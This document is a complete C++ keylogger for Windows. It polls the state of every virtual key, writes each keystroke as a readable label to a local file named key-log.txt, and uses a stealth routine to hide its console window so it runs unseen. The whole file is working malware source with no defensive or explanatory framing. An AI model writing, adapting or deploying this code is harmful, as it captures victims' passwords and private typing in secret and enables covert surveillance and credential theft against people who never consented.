#include <iostream>
#include <WinUser.h>
#include <Windows.h>
#include <fstream>
#include <string>

using namespace std;

void writeToLog(string Key)
{
    ofstream log;
    log.open("key-log.txt", ios::app);
    log << Key;
    log.close();
}

void checkForLog(int Key)
{
    switch (Key)
    {
    case 1:
        writeToLog("[LEFT MOUSE BUTTON]");
        break;
    case 2:
        writeToLog("[RIGHT MOUSE BUTTON]");
        break;
    case 3:
        writeToLog("[CONTROL-BREAK PROCESSING]");
        break;
    case 4:
        writeToLog("[MIDDLE MOUSE BUTTON]");
        break;
    case 5:
        writeToLog("[X1 MOUSE BUTTON]");
        break;
    case 6:
        writeToLog("[X2 MOUSE BUTTON]");
        break;
    case 8:
        writeToLog("[BACKSPACE]");
        break;
    case 9:
        writeToLog("[TAB]");
        break;
    case 12:
        writeToLog("[CLEAR]");
        break;
    case 13:
        writeToLog("[ENTER]");
        break;
    case 16:
        writeToLog("[SHIFT]");
        break;
    case 17:
        writeToLog("[CTRL]");
        break;
    case 18:
        writeToLog("[ALT]");
        break;
    case 19:
        writeToLog("[PAUSE]");
        break;
    case 20:
        writeToLog("[CAPS LOCK]");
        break;
    case 21:
        writeToLog("[IME (KANA / HANGUEL / HANGUL) MODE]");
        break;
    case 22:
        writeToLog("[IME ON]");
        break;
    case 23:
        writeToLog("[IME JUNJA MODE]");
        break;
    case 24:
        writeToLog("[IME FINAL MODE]");
        break;
    case 25:
        writeToLog("[IME (HANJA / KANJI) MODE]");
        break;
    case 26:
        writeToLog("[IME OFF]");
        break;
    case 27:
        writeToLog("[ESC]");
        break;
    case 28:
        writeToLog("[IME CONVERT]");
        break;
    case 29:
        writeToLog("[IME NONCONVERT]");
        break;
    case 30:
        writeToLog("[IME ACCEPT]");
        break;
    case 31:
        writeToLog("[IME MODE CHANGE REQUEST]");
        break;
    case 32:
        writeToLog("[SPACEBAR]");
        break;
    case 33:
        writeToLog("[PAGE UP]");
        break;
    case 34:
        writeToLog("[PAGE DOWN]");
        break;
    case 35:
        writeToLog("[END]");
        break;
    case 36:
        writeToLog("[HOME]");
        break;
    case 37:
        writeToLog("[LEFT ARROW]");
        break;
    case 38:
        writeToLog("[UP ARROW]");
        break;
    case 39:
        writeToLog("[RIGHT ARROW]");
        break;
    case 40:
        writeToLog("[DOWN ARROW]");
        break;
    case 41:
        writeToLog("[SELECT]");
        break;
    case 42:
        writeToLog("[PRINT]");
        break;
    case 43:
        writeToLog("[EXECUTE]");
        break;
    case 44:
        writeToLog("[PRINT SCREEN]");
        break;
    case 45:
        writeToLog("[INSERT]");
        break;
    case 46:
        writeToLog("[DELETE]");
        break;
    case 47:
        writeToLog("[HELP]");
        break;
    case 48:
        writeToLog("0");
        break;
    case 49:
        writeToLog("1");
        break;
    case 50:
        writeToLog("2");
        break;
    case 51:
        writeToLog("3");
        break;
    case 52:
        writeToLog("4");
        break;
    case 53:
        writeToLog("5");
        break;
    case 54:
        writeToLog("6");
        break;
    case 55:
        writeToLog("7");
        break;
    case 56:
        writeToLog("8");
        break;
    case 57:
        writeToLog("9");
        break;
    case 65:
        writeToLog("A");
        break;
    case 66:
        writeToLog("B");
        break;
    case 67:
        writeToLog("C");
        break;
    case 68:
        writeToLog("D");
        break;
    case 69:
        writeToLog("E");
        break;
    case 70:
        writeToLog("F");
        break;
    case 71:
        writeToLog("G");
        break;
    case 72:
        writeToLog("H");
        break;
    case 73:
        writeToLog("I");
        break;
    case 74:
        writeToLog("J");
        break;
    case 75:
        writeToLog("K");
        break;
    case 76:
        writeToLog("L");
        break;
    case 77:
        writeToLog("M");
        break;
    case 78:
        writeToLog("N");
        break;
    case 79:
        writeToLog("O");
        break;
    case 80:
        writeToLog("P");
        break;
    case 81:
        writeToLog("Q");
        break;
    case 82:
        writeToLog("R");
        break;
    case 83:
        writeToLog("S");
        break;
    case 84:
        writeToLog("T");
        break;
    case 85:
        writeToLog("U");
        break;
    case 86:
        writeToLog("V");
        break;
    case 87:
        writeToLog("W");
        break;
    case 88:
        writeToLog("X");
        break;
    case 89:
        writeToLog("Y");
        break;
    case 90:
        writeToLog("Z");
        break;
    case 91:
        writeToLog("[LEFT WINDOWS KEY]");
        break;
    case 92:
        writeToLog("[RIGHT WINDOWS KEY]");
        break;
    case 93:
        writeToLog("[APPLICATIONS KEY]");
        break;
    case 95:
        writeToLog("[COMPUTER SLEEP]");
        break;
    case 96:
        writeToLog("[NUMERIC KEYPAD 0]");
        break;
    case 97:
        writeToLog("[NUMERIC KEYPAD 1]");
        break;
    case 98:
        writeToLog("[NUMERIC KEYPAD 2]");
        break;
    case 99:
        writeToLog("[NUMERIC KEYPAD 3]");
        break;
    case 100:
        writeToLog("[NUMERIC KEYPAD 4]");
        break;
    case 101:
        writeToLog("[NUMERIC KEYPAD 5]");
        break;
    case 102:
        writeToLog("[NUMERIC KEYPAD 6]");
        break;
    case 103:
        writeToLog("[NUMERIC KEYPAD 7]");
        break;
    case 104:
        writeToLog("[NUMERIC KEYPAD 8]");
        break;
    case 105:
        writeToLog("[NUMERIC KEYPAD 9]");
        break;
    case 106:
        writeToLog("[MULTIPLY]");
        break;
    case 107:
        writeToLog("[ADD]");
        break;
    case 108:
        writeToLog("[SEPERATOR]");
        break;
    case 109:
        writeToLog("[SUBTRACT]");
        break;
    case 110:
        writeToLog("[DECIMAL]");
        break;
    case 111:
        writeToLog("[DIVIDE]");
        break;
    case 112:
        writeToLog("[F1]");
        break;
    case 113:
        writeToLog("[F2]");
        break;
    case 114:
        writeToLog("[F3]");
        break;
    case 115:
        writeToLog("[F4]");
        break;
    case 116:
        writeToLog("[F5]");
        break;
    case 117:
        writeToLog("[F6]");
        break;
    case 118:
        writeToLog("[F7]");
        break;
    case 119:
        writeToLog("[F8]");
        break;
    case 120:
        writeToLog("[F9]");
        break;
    case 121:
        writeToLog("[F10]");
        break;
    case 122:
        writeToLog("[F11]");
        break;
    case 123:
        writeToLog("[F12]");
        break;
    case 124:
        writeToLog("[F13]");
        break;
    case 125:
        writeToLog("[F14]");
        break;
    case 126:
        writeToLog("[F15]");
        break;
    case 127:
        writeToLog("[F16]");
        break;
    case 128:
        writeToLog("[F17]");
        break;
    case 129:
        writeToLog("[F18]");
        break;
    case 130:
        writeToLog("[F19]");
        break;
    case 131:
        writeToLog("[F20]");
        break;
    case 132:
        writeToLog("[F21]");
        break;
    case 133:
        writeToLog("[F22]");
        break;
    case 134:
        writeToLog("[F23]");
        break;
    case 135:
        writeToLog("[F24]");
        break;
    case 144:
        writeToLog("[NUM LOCK]");
        break;
    case 145:
        writeToLog("[SCROLL LOCK]");
        break;
    case 146:
    case 147:
    case 148:
    case 149:
    case 150:
        writeToLog("[OEM SPECIFIC]");
        break;
    case 160:
        writeToLog("[LEFT SHIFT]");
        break;
    case 161:
        writeToLog("[RIGHT SHIFT]");
        break;
    case 162:
        writeToLog("[LEFT CONTROL]");
        break;
    case 163:
        writeToLog("[RIGHT CONTROL]");
        break;
    case 164:
        writeToLog("[LEFT MENU]");
        break;
    case 165:
        writeToLog("[RIGHT MENU]");
        break;
    case 166:
        writeToLog("[BROWSER BACK]");
        break;
    case 167:
        writeToLog("[BROWSER FORWARD]");
        break;
    case 168:
        writeToLog("[BROWSER REFRESH]");
        break;
    case 169:
        writeToLog("[BROWSER STOP]");
        break;
    case 170:
        writeToLog("[BROWSER SEARCH]");
        break;
    case 171:
        writeToLog("[BROWSER FAVORITES]");
        break;
    case 172:
        writeToLog("[BROWSER START AND HOME]");
        break;
    case 173:
        writeToLog("[VOLUME MUTE]");
        break;
    case 174:
        writeToLog("[VOLUME DOWN]");
        break;
    case 175:
        writeToLog("[VOLUME UP]");
        break;
    case 176:
        writeToLog("[NEXT TRACK]");
        break;
    case 177:
        writeToLog("[PREVIOUS TRACK]");
        break;
    case 178:
        writeToLog("[STOP MEDIA]");
        break;
    case 179:
        writeToLog("[PLAY/PAUSE MEDIA]");
        break;
    case 180:
        writeToLog("[START MAIL]");
        break;
    case 181:
        writeToLog("[SELECT MEDIA]");
        break;
    case 182:
        writeToLog("[START APPLICATION 1]");
        break;
    case 183:
        writeToLog("[START APPLICATION 2]");
        break;
    case 186:
        writeToLog("[; or :]");
        break;
    case 187:
        writeToLog("+");
        break;
    case 188:
        writeToLog(",");
        break;
    case 189:
        writeToLog("-");
        break;
    case 190:
        writeToLog(".");
        break;
    case 191:
        writeToLog("[ / or ? ]");
        break;
    case 192:
        writeToLog("[ ` or ~ ]");
        break;
    case 219:
        writeToLog("[ [ or { ]");
        break;
    case 220:
        writeToLog("[ \\ or | ]");
        break;
    case 221:
        writeToLog("[ ] or } ]");
        break;
    case 222:
        writeToLog("[ \' or \" ]");
        break;
    case 223:
        writeToLog("[MISELLANEOUS CHARACTER]");
        break;
    case 225:
        writeToLog("[OEM SPECIFIC]");
        break;
    case 226:
        writeToLog("[ <> or \\ ]");
        break;
    case 227:
    case 228:
        writeToLog("[OEM SPECIFIC]");
        break;
    case 229:
        writeToLog("[IME PROCESS]");
        break;
    case 230:
        writeToLog("[OEM SPECIFIC]");
        break;
    case 231:
        writeToLog("[NON KEYBOARD INPUT]");
        break;
    case 233:
    case 234:
    case 235:
    case 236:
    case 237:
    case 238:
    case 239:
    case 240:
    case 241:
    case 242:
    case 243:
    case 244:
    case 245:
        writeToLog("[OEM SPECIFIC]");
        break;
    case 246:
        writeToLog("[ATTN]");
        break;
    case 247:
        writeToLog("[CRSEL]");
        break;
    case 248:
        writeToLog("[EXSEL]");
        break;
    case 249:
        writeToLog("[ERASE EOF]");
        break;
    case 250:
        writeToLog("[PLAY]");
        break;
    case 251:
        writeToLog("[ZOOM]");
        break;
    case 253:
        writeToLog("[PA1]");
        break;
    case 254:
        writeToLog("[CLEAR]");
        break;
    }
}

void logger()
{
    Sleep(10);
    for (int i = 1; i <= 254; i++)
    {
        if (GetAsyncKeyState(i) == -32767)
        {
            checkForLog(i);
        }
    }
}

void stealth()
{
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth, 0);
}

main()
{
    stealth();
    while (true)
    {
        logger();
    }
    return 0;
}